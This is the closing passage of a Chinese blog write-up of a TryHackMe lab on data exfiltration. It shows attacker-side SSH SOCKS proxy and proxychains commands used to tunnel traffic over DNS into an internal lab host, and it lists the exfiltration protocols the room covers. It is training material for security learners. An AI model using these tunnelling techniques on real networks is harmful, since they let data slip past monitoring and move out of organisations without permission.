#- ssh thm@<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>: 连接远程服务器<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>，登录用户名是thm
#- -<span class="hljs-number">4</span>: 使用IPv4地址，不使用IPv6
#- <span class="hljs-attribute">-f</span>: 将SSH在后台运行，不连接控制终端
#- <span class="hljs-attribute">-N</span>: 不执行远程命令，仅用于端口转发
#- -D <span class="hljs-number">1080</span>: 在本地端口<span class="hljs-number">1080</span>上创建一个SOCKS代理</code></pre>
<p>现在我们已经通过 dns0 网络连接到 JumpBox，打开一个新终端并使用 ProxyChains 或 Firefox，将 127.0.0.1 和端口 1080 作为代理设置。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@attacker</span>$ proxychains curl <span class="hljs-attribute">http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>/demo.php
root<span class="hljs-keyword">@attacker</span>$ #<span class="hljs-keyword">OR</span>
root<span class="hljs-keyword">@attacker</span>$ curl --socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span> <span class="hljs-attribute">http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>/demo.php</code></pre>
<p>我们可以通过eth0接口检查攻击者机器上的Tcpdump来确认所有流量都经过DNS协议。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009690.png" alt></p>
<p>在所提供的网络环境中应用DNS隧道技术，访问<a target="_blank" rel="noopener" href="http://192.168.0.100/test.php%E5%9B%9E%E7%AD%94%E4%BB%A5%E4%B8%8B%E9%97%AE%E9%A2%98">http://192.168.0.100/test.php回答以下问题</a>.<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009691.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009692.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009693.png" alt></p>
<h1 id="0x011-结论">0x011 结论</h1>
<p>在这个房间中，我们介绍了数据泄露技术的基础知识，包括各种网络协议：</p>
<ul>
<li>TCP&nbsp;Sockets</li>
<li>SSH</li>
<li>HTTP/HTTPS</li>
<li>ICMP</li>
<li>DNS<br>
完成这个房间后，您现在应该对什么是数据泄露以及可以尝试用于传输数据的类型和协议有一个大致的了解。</li>
</ul>
<h2 id="例子">例子</h2>
<p>以下是因数据泄露技术而成为数据泄露受害者的公司。</p>
<ol>
<li>SunTrust 银行发生了一起内部数据泄露事件，在多达 150 万个客户敏感数据（包括姓名、地址、电话号码和账户余额）被盗后，发现了离开网络的可疑流量。</li>
<li>特斯拉是内部人士数据泄露的受害者，导致数据泄露。 2018 年，一名员工向第三方泄露了数十亿字节的机密照片和代码制造操作系统，其中包括其他个人和敏感数据。</li>
<li>Travelex 是世界领先的货币兑换专家。 2020 年，它是名为 Sodinokibi 的勒索软件的受害者。攻击者利用其中一台内部服务器的未修补漏洞。攻击者利用其中一台内部服务器中未修补的漏洞，使他们能够使用其中一种渗透技术将敏感数据从组织的网络中渗漏出来。敏感数据包括个人身份信息 (PII) 和财务信息。</li>
</ol>
<h2 id="其他资源">其他资源</h2>
<p>数据泄露并不限于本会议室讨论的协议和方法。以下链接是“Living Off Trusted Sites”，可用于窃取数据或使用合法网站进行 C2 通信。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lots-project.com/">依靠可信站点 (LOTS) 项目生活</a></li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/')">THM-数据泄露</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-数据泄露&amp;url=http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/16/thm-enumeration/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Enumeration</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux提权学习之rbash逃逸</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">欢迎来到数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-number">2.</span> <span class="toc-text">0x02 网络基础设施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">2.1.</span> <span class="toc-text">部署虚拟机！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8E%A8%E8%8D%90"><span class="toc-number">2.2.</span> <span class="toc-text">实验室推荐</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">0x03 数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">什么是数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F"><span class="toc-number">3.2.</span> <span class="toc-text">如何使用数据渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.1.</span> <span class="toc-text">传统数据泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c2-%E9%80%9A%E8%AE%AF"><span class="toc-number">3.2.2.</span> <span class="toc-text">C2 通讯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.3.</span> <span class="toc-text">隧道技术</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-tcp-socket-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">0x04 TCP socket 进行渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-ssh-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">0x05 SSH 进行渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-https-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">0x06 HTTP(S) 进行渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http-post-%E8%AF%B7%E6%B1%82"><span class="toc-number">6.1.</span> <span class="toc-text">HTTP POST 请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">6.2.</span> <span class="toc-text">HTTP 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#https-%E9%80%9A%E8%AE%AF"><span class="toc-number">6.3.</span> <span class="toc-text">HTTPS 通讯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E9%9A%A7%E9%81%93"><span class="toc-number">6.4.</span> <span class="toc-text">HTTP 隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E4%BD%BF%E7%94%A8-icmp-%E6%B8%97%E9%80%8F"><span class="toc-number">7.</span> <span class="toc-text">0x07 使用 ICMP 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-%E6%95%B0%E6%8D%AE%E9%83%A8%E5%88%86"><span class="toc-number">7.1.</span> <span class="toc-text">ICMP 数据部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">7.2.</span> <span class="toc-text">ICMP 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-c2-%E9%80%9A%E4%BF%A1"><span class="toc-number">7.3.</span> <span class="toc-text">ICMP C2 通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-dns-%E9%85%8D%E7%BD%AE"><span class="toc-number">8.</span> <span class="toc-text">0x08 DNS 配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="toc-number">8.1.</span> <span class="toc-text">新攻击机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E4%BA%8E-dns-%E6%B8%97%E9%80%8F%E7%9A%84%E5%90%8D%E7%A7%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.2.</span> <span class="toc-text">用于 DNS 渗透的名称服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%BB%BA%E8%AE%AE"><span class="toc-number">8.3.</span> <span class="toc-text">实验室建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns%E6%B5%8B%E8%AF%95"><span class="toc-number">8.4.</span> <span class="toc-text">DNS测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%94%A8-dns-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">9.</span> <span class="toc-text">0x09 用 DNS 进行渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-dns-%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F"><span class="toc-number">9.1.</span> <span class="toc-text">什么是 DNS 数据渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8-dns-%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4"><span class="toc-number">9.2.</span> <span class="toc-text">什么时候需要使用 DNS 数据过滤？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9dns%E8%AE%B0%E5%BD%95"><span class="toc-number">9.3.</span> <span class="toc-text">修改DNS记录！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">9.4.</span> <span class="toc-text">DNS 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-dns-%E7%9A%84-c2-%E9%80%9A%E4%BF%A1"><span class="toc-number">9.5.</span> <span class="toc-text">通过 DNS 的 C2 通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-dns-%E9%9A%A7%E9%81%93"><span class="toc-number">10.</span> <span class="toc-text">0x11 DNS 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dns-%E9%9A%A7%E9%81%93-tcpoverdns"><span class="toc-number">10.1.</span> <span class="toc-text">DNS 隧道 (TCPoverDNS)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-%E7%BB%93%E8%AE%BA"><span class="toc-number">11.</span> <span class="toc-text">0x011 结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">11.1.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90"><span class="toc-number">11.2.</span> <span class="toc-text">其他资源</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a 